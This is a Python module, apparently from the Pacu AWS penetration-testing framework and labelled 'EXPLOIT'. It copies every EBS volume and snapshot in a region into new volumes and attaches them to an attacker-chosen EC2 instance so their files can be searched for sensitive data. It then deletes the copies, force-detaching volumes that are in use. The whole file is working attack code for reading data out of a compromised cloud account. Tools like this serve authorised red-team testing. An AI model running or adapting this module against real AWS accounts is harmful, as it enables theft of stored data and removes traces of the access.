#!/usr/bin/env python3
"""Module for ebs_snapshot_explorer"""
import argparse
from copy import deepcopy
import json
from pathlib import Path

from botocore.exceptions import ClientError

from pacu.core.lib import session_dir

module_info = {
    'name': 'ebs__explore_snapshots',
    'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',
    'category': 'EXPLOIT',
    'one_liner': 'Restores and attaches EBS volumes/snapshots to an EC2 instance of your choice.',
    'description': 'This module will cycle through existing EBS volumes and create snapshots of them, then restore those '
                   'snapshots and existing snapshots to new EBS volumes, which will then be attached to the supplied EC2 '
                   'instance for you to mount. This will give you access to the files on the various volumes, where you can '
                   'then look for sensitive information. Afterwards, it will cleanup the created volumes and snapshots by '
                   'detaching them from your instance and removing them from the AWS account.',
    'services': ['EC2'],
    'prerequisite_modules': ['ec2__enum', 'ebs__enum_volumes_snapshots'],
    'arguments_to_autocomplete': ['--instance-id', '--zone'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument(
    '--instance-id',
    required=True,
    help='InstanceId of instance to target'
)
parser.add_argument(
    '--zone',
    required=True,
    help='Availability zone of instance to target'
)

SET_COUNT = 10


def load_volumes(pacu, client, instance_id, volume_ids):
    """Loads volumes on an instance.

    Args:
        client (boto3.client): client to interact with AWS
        print (func): Overwritten built-in print function
        input (func): Overwritten built-in input function
        instance_id (str): instance_id to attach volumes to
        volume_ids (list): list of volume_ids to attach to the instance.
    Returns:
        bool: True if all volumes were successfully attached.
    """

    # load volume set
    set_index = 0

    while set_index < len(volume_ids):
        current_volume_set = volume_ids[set_index:set_index + SET_COUNT]
        waiter = client.get_waiter('volume_available')
        waiter.wait(VolumeIds=current_volume_set)
        attached = modify_volume_list(
            pacu, client, 'attach_volume', instance_id, current_volume_set
        )
        if not attached:
            pacu.print(' Volume attachment failed')
            pacu.print(' Exiting...')
            running = False

        while True:
            response = pacu.input('    Load next set of volumes? (y/n) ')
            if response.lower() == 'y':
                running = True
                break
            elif response.lower() == 'n':
                running = False
                break

        detached = modify_volume_list(
            pacu, client, 'detach_volume', instance_id, current_volume_set
        )
        if not detached:
            pacu.print(' Volume detachment failed')
            pacu.print(' Exiting...')
            running = False
        waiter.wait(VolumeIds=current_volume_set)
        set_index += SET_COUNT
        if not running:
            break
    cleanup(client)
    return True


def modify_volume_list(pacu, client, func, instance_id, volume_id_list):
    """Helper function to load volumes on an instance to not overload the
    instance.

    Args:
        client (boto3.client): client to interact with AWS
        print (func): Overwritten built-in print function
        func (str): Function sname to modify_volume_list
        instance_id (str): instance_id to attach volumes to
        volume_ids (list): list of volume_ids to (de)attach to the instance.
    Returns:
        bool: True if the volumes were successfully modified.
    """
    available_devices_iterator = iter(get_valid_devices(pacu, instance_id))
    for volume_id in volume_id_list:
        try:
            kwargs = {
                'InstanceId': instance_id,
                'VolumeId': volume_id
            }
            if func == 'attach_volume':
                kwargs['Device'] = next(available_devices_iterator)
            caller = getattr(client, func)
            caller(**kwargs)
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'UnauthorizedOperation':
                pacu.print('  FAILURE MISSING AWS PERMISSIONS')
            else:
                pacu.print(error)
            return False
    return True


def get_valid_devices(pacu, instance_id):
    """Returns the next device mapping available

    Args:
        client (boto3.client): Client that gets the current block device mappings
        instance (str): InstanceId to get curretn block device mappings
    Returns:
        str: Returns next mapping in form of /dev/xvd[base], otherwise /dev/xvdzz

    """
    instance = [instance for instance in get_instances(pacu) if instance['InstanceId'] == instance_id]
    # TODO: If KeyError is raised here it's likely because ec2_enum needs to be run again
    mappings = instance[0]['BlockDeviceMappings']
    current_mappings = [device['DeviceName'] for device in mappings]
    last_mapping = sorted(current_mappings)[-1]
    available_devices = [get_valid_device(last_mapping)]
    for _ in range(SET_COUNT):
        available_devices.append(get_valid_device(available_devices[-1]))
    return available_devices


def get_valid_device(previous_device):
    """Helper function that returns the next device given a previous device"""
    return previous_device[:-1] + next_char(previous_device[-1])


def next_char(char):
    """Gets the next sequential character

    Args:
        char (str): Character to increment
    Returns:
        str: Incremented passed char
    """
    out = chr(ord(char) + 1)
    return out if out != '{' else 'aa'


def get_instances(pacu):
    """Returns snapshots given an AWS region
    Args:
        pacu (Main): Reference to Pacu
    Returns:
        list: List of Instances.
    """
    ec2_data = deepcopy(pacu.get_active_session().EC2)
    if 'Instances' not in ec2_data:
        fields = ['EC2', 'Instances']
        module = module_info['prerequisite_modules'][0]
        args = '--instances'
        fetched_ec2_instances = pacu.fetch_data(fields, module, args)
        if fetched_ec2_instances is False:
            return []
        instance_data = deepcopy(pacu.get_active_session().EC2)
        return instance_data['Instances']
    return ec2_data['Instances']


def get_snapshots(pacu):
    """Returns snapshots given an AWS region
    Args:
        pacu (Main): Reference to Pacu
    Returns:
        list: List of Snapshots.
    """
    ec2_data = deepcopy(pacu.get_active_session().EC2)
    if 'Snapshots' not in ec2_data or not ec2_data['Snapshots']:
        fields = ['EC2', 'Snapshots']
        module = module_info['prerequisite_modules'][1]
        args = '--snaps'
        fetched_snapshots = pacu.fetch_data(fields, module, args)
        if fetched_snapshots is False:
            return []
        snap_data = deepcopy(pacu.get_active_session().EC2)
        return snap_data['Snapshots']
    return ec2_data['Snapshots']


def get_volumes(pacu):
    """Returns volumes given an AWS region
    Args:
        pacu (Main): Reference to Pacu
    Returns:
        dict: Mapping regions to corresponding list of volume_ids.
    """
    ec2_data = deepcopy(pacu.get_active_session().EC2)
    if 'Volumes' not in ec2_data or not ec2_data['Volumes']:
        pacu.print('Fetching Volume data...')
        fields = ['EC2', 'Volumes']
        module = module_info['prerequisite_modules'][1]
        args = '--vols'
        fetched_volumes = pacu.fetch_data(fields, module, args)
        if fetched_volumes is False:
            return []
        vol_data = deepcopy(pacu.get_active_session().EC2)
        return vol_data['Volumes']
    return ec2_data['Volumes']


def generate_volumes_from_snapshots(client, snapshots, zone):
    """Returns a list of generated volumes"""
    volume_ids = []
    waiter = client.get_waiter('snapshot_completed')
    waiter.wait(SnapshotIds=snapshots)
    for snapshot in snapshots:
        response = client.create_volume(SnapshotId=snapshot, AvailabilityZone=zone)
        volume_ids.append(response['VolumeId'])
    store_temp_data({'volumes': volume_ids})
    return volume_ids


def generate_snapshots_from_volumes(client, volume_ids):
    """Returns a list of generated snapshots from volumes"""
    snapshot_ids = []
    for volume in volume_ids:
        response = client.create_snapshot(VolumeId=volume)
        snapshot_ids.append(response['SnapshotId'])

    store_temp_data({'snapshots': snapshot_ids})
    return snapshot_ids


def delete_volumes(client, volumes):
    """Deletes a given list of volumes

    If the volume is in use, the volume is forcibly detached because this module
    only deals with temporary copies so data integrity is not a high priority when
    a volume is ready to be detatched. After the volume is forcibly detatched, the
    volume will be deleted after the detaching operation finishes.
    """
    failed_volumes = []
    for volume in volumes:
        try:
            client.delete_volume(VolumeId=volume)
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'VolumeInUse':
                client.detach_volume(
                    VolumeId=volume,
                    Force=True)
                waiter = client.get_waiter('volume_available')
                waiter.wait(VolumeIds=[volume])
                client.delete_volume(VolumeId=volume)
                continue
            failed_volumes.append(volume)
    return failed_volumes


def delete_snapshots(client, snapshots):
    """Deletes a given list of snapshots"""
    failed_snapshots = []
    for snapshot in snapshots:
        try:
            client.delete_snapshot(SnapshotId=snapshot)
        except ClientError:
            failed_snapshots.append(snapshot)
    return failed_snapshots


def cleanup(client):
    """Cleans up the temporary snapshots and volumes created during this
    modules execution
    """
    new_data = {}
    success = True
    temp_file = session_dir()/'modules'/module_info['name']/ 'temp.json'
    if temp_file.is_file():
        with temp_file.open('r') as file:
            data = json.load(file)
            if 'snapshots' in data:
                new_data['snapshots'] = delete_snapshots(client, data['snapshots'])
            if 'volumes' in data:
                new_data['volumes'] = delete_volumes(client, data['volumes'])
        if 'volumes' in new_data and new_data['volumes']:
            print('  Failed to delete volumes: {}'.format(new_data['volumes']))
            success = False
        if 'snapshots' in new_data and new_data['snapshots']:
            print('  Failed to delete snapshots: {}'.format(new_data['snapshots']))
            success = False
        store_temp_data(new_data)
        if success:
            temp_file.unlink()
    return success


def store_temp_data(data):
    """Stores temporary data in a JSON file"""
    temp_file = session_dir()/'modules'/module_info['name']/ 'temp.json'
    if temp_file.exists():
        with temp_file.open('r') as json_file:
            existing_data = json.load(json_file)
            data.update(existing_data)
    with temp_file.open('w+') as json_file:
        json.dump(data, json_file)


def main(args, pacu):
    """Main module function, called from Pacu"""
    summary_data = {}
    instance_id = parser.parse_args(args).instance_id
    zone = parser.parse_args(args).zone
    region = zone[:-1]
    client = pacu.get_boto3_client('ec2', region)

    if not cleanup(client):
        pacu.print('  Cleanup failed')
        return summary_data

    snapshots = [snap['SnapshotId'] for snap in get_snapshots(pacu) if snap['Region'] == region]
    volumes = [vol['VolumeId'] for vol in get_volumes(pacu) if vol['Region'] == region]
    summary_data.update({'snapshots': len(snapshots), 'volumes': len(volumes)})

    pacu.print('  Attaching volumes...')
    temp_snaps = generate_snapshots_from_volumes(client, volumes)
    temp_volumes = generate_volumes_from_snapshots(client, temp_snaps, zone)
    load_volumes(pacu, client, instance_id, temp_volumes)
    pacu.print('  Finished attaching volumes...')

    pacu.print('  Attaching volumes from existing snapshots...')
    temp_volumes = generate_volumes_from_snapshots(client, snapshots, zone)
    load_volumes(pacu, client, instance_id, temp_volumes)
    pacu.print('  Finished attaching existing snapshot volumes...')

    return summary_data


def summary(data, pacu):
    """Returns a formatted string based on passed data."""
    out = ''
    if 'snapshots' in data:
        out += '  {} Snapshots loaded\n'.format(data['snapshots'])
    if 'volumes' in data:
        out += '  {} Volumes loaded\n'.format(data['volumes'])
    if not out:
        return '  No volumes were loaded\n'
    return out
